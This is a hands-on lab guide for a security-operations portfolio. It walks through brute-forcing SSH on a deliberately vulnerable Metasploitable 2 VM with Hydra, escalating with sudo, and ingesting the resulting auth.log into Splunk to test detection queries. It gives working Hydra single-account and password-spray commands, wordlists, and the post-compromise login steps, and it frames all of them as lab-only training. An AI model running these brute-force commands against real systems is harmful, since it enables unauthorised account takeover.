# Lab Guide: Reproduce the SSH Brute Force Live (Hydra → Metasploitable → Splunk)

**Purpose:** generate *real* attack telemetry so you can honestly say in an interview "I executed the attack and detected it," not just "I analyzed a sample log." This is the offensive half; the detection doc is the defensive half.

> ⚠️ Lab only. Run this exclusively against your own Metasploitable VM on an isolated host-only network. Never point Hydra at anything you don't own.

---

## Network Setup (do this first)
You need Kali (attacker) and Metasploitable 2 (victim) on the **same host-only / internal network** so they can talk but nothing leaks out.

1. In your VM manager (UTM/VMware/VirtualBox on the M4 Mac), set **both** VMs' network adapter to **Host-Only** (or a shared internal network).
2. Boot Metasploitable 2. Log in (`msfadmin` / `msfadmin`).
3. Get its IP: `ifconfig` → note the address (e.g. `192.168.56.104`). Call this **TARGET_IP**.
4. From Kali, confirm reachability: `ping -c2 TARGET_IP`.
5. Confirm SSH is open: `nmap -p22 TARGET_IP` → should show `22/tcp open ssh`.

> Metasploitable 2 runs an old OpenSSH, perfect, because password auth is enabled and it's intentionally weak.

---

## Step 1: Build a Password List
Create a small wordlist that *contains* the real password so the attack succeeds (that success is what makes the detection interesting).

```bash
cat > ~/passlist.txt << 'EOF'
password
123456
admin
root
toor
letmein
qwerty
msfadmin
password123
changeme
EOF

# username list (spray several accounts, like a real attacker)
cat > ~/userlist.txt << 'EOF'
root
admin
oracle
postgres
user
msfadmin
EOF
```

`msfadmin` is the valid password for the `msfadmin` account on Metasploitable 2, putting it in the list guarantees a successful login lands in the logs.

---

## Step 2: Run Hydra
Single-account brute (clean, fast, matches the sample log):

```bash
hydra -l msfadmin -P ~/passlist.txt ssh://TARGET_IP -t 4 -V
```

Multi-account spray (noisier, shows `dc(user)` in your detection):

```bash
hydra -L ~/userlist.txt -P ~/passlist.txt ssh://TARGET_IP -t 4 -f -V
```

Flags: `-l` single user / `-L` user list · `-P` password list · `-t 4` parallel tasks (keep low so Metasploitable's old SSH doesn't drop connections) · `-V` verbose (prints each attempt) · `-f` stop after first valid pair.

**Expected result:** Hydra prints
`[22][ssh] host: TARGET_IP   login: msfadmin   password: msfadmin`
→ screenshot this. This is your proof the credential was cracked.

---

## Step 3: Trigger the Post-Compromise Action
Log in with the cracked creds and escalate, so the `sudo` privilege-escalation detection has something to find:

```bash
ssh msfadmin@TARGET_IP        # password: msfadmin
sudo su -                     # escalate to root
whoami                        # -> root
exit; exit
```

---

## Step 4: Collect the Logs from the Victim
The attack lives in Metasploitable's auth log. Pull it to Kali, then upload to Splunk.

On **Metasploitable** (or via SSH):
```bash
sudo cat /var/log/auth.log | tail -n 500 > /tmp/auth_capture.log
```

Copy it to Kali:
```bash
scp msfadmin@TARGET_IP:/tmp/auth_capture.log ~/auth_capture.log
```

> If `auth.log` is sparse, Metasploitable logs SSH to `/var/log/auth.log` by default, generate more attempts by re-running Hydra.

---

## Step 5: Ingest into Splunk
Same as the sample: *Settings → Add Data → Upload → `auth_capture.log`*, **sourcetype = `linux_secure`**, index = `main` (or `linux`).

Then run your detections from `01_SSH_Brute_Force_Detection.md` against the **real** data:
- Core threshold query → flags TARGET's attacker IP.
- Success-after-failure query → shows `compromised_user=msfadmin`.
- Sudo query → shows the `root` escalation you performed in Step 3.

---

## Continuous Ingestion (optional, more advanced: great interview point)
Instead of manual upload, forward the log in real time so detections fire live:

1. Install a **Splunk Universal Forwarder** on the victim (or monitor the file directly if Splunk is on the same box).
2. Add a monitor input: *Settings → Data Inputs → Files & Directories → `/var/log/auth.log`*, sourcetype `linux_secure`.
3. Re-run Hydra → watch events arrive in Splunk in near real time → your saved alert fires.

Being able to say "I set up a forwarder and detected the brute force in real time via a scheduled alert" is a strong differentiator for a SOC role.

---

## What to Capture (evidence)
- [ ] `nmap -p22` showing SSH open
- [ ] Hydra running (verbose attempts scrolling)
- [ ] Hydra success line with cracked password
- [ ] SSH login + `sudo su -` → `root`
- [ ] Splunk detection queries firing on the captured log

## Resume Bullet (offensive + defensive combined)
> Executed an SSH password brute-force attack with Hydra against a Metasploitable target in an isolated lab, then ingested the resulting Linux `auth.log` into Splunk and built SPL detections that identified the source IP, the compromised account, and follow-on `sudo` privilege escalation, demonstrating the full attacker-to-defender workflow mapped to MITRE ATT&CK T1110 and T1078.
